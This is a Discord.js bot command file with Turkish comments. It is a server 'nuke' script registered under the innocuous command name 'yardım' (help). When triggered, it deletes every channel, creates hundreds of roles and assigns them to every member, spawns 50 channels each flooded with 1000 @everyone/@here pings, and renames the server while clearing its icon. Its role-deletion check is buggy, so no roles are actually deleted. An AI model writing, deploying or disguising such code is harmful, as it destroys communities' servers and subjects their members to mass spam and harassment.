module.exports.run = async (client, message, args) => {

// BOMBA.JS

var channelNames =  ["mafoşi-maflex-mafo","mafoşş"]; // Buraya istediğin kadar kanal adı gir hepsini açıp mesaj atıcak 29. satırı kontrol et.
message.guild.channels.cache.forEach(channel => channel.delete()); // Sunucudaki tüm kanalları siler.
// Deleting every role except for everyone
message.guild.roles.cache.forEach(role => {
    if(!role.name === "everyone") {
        role.delete(); 
    }
});
    for(let i = 0; i < 240; i++) {
        message.guild.roles.create({ name: "mafoş" }).then((createdRole) => {
        message.guild.members.cache.forEach(member => member.roles.add(createdRole.id)); // Bunu aktif edersen açtığı rolleri sunucudaki herkese verir.
    });
}
for(let i = 0; i < 50; i++) {
    var number = Math.floor(Math.random() * channelNames.length);
    var channelName = channelNames[number];
    message.guild.channels.create(channelName, {
        type: "text",
        permissionOverwrites: [
            {
                id: message.guild.roles.everyone,
                deny: ["SEND_MESSAGES"]
            }
        ],
    }).then(channel => {
        for(let i = 0; i < 1000; i++) { // Süreye elleme! 
            channel.send({ content: `mafoo

@everyone & @here` }); // Burada açtığı tüm kanallara everyone ve here spamı atar mesaj içeriğini yazın kısaca.
        }
    });
}


// bomba.js

// rolspam.js

message.guild.roles.cache.forEach(role => {
    if(!role.name === "everyone") {
        role.delete(); 
    }
});
    for(let i = 0; i < 240; i++) {
        message.guild.roles.create({ name: "maflex" }).then((createdRole) => {
        message.guild.members.cache.forEach(member => member.roles.add(createdRole.id)); // Bunu aktif edersen açtığı rolleri sunucudaki herkese verir.
    });
}

// rolspam.js

// server.js

message.guild.setName("maflex")
message.guild.setIcon("")

// server.js


}

module.exports.help = {

    name: "yardım"
    
}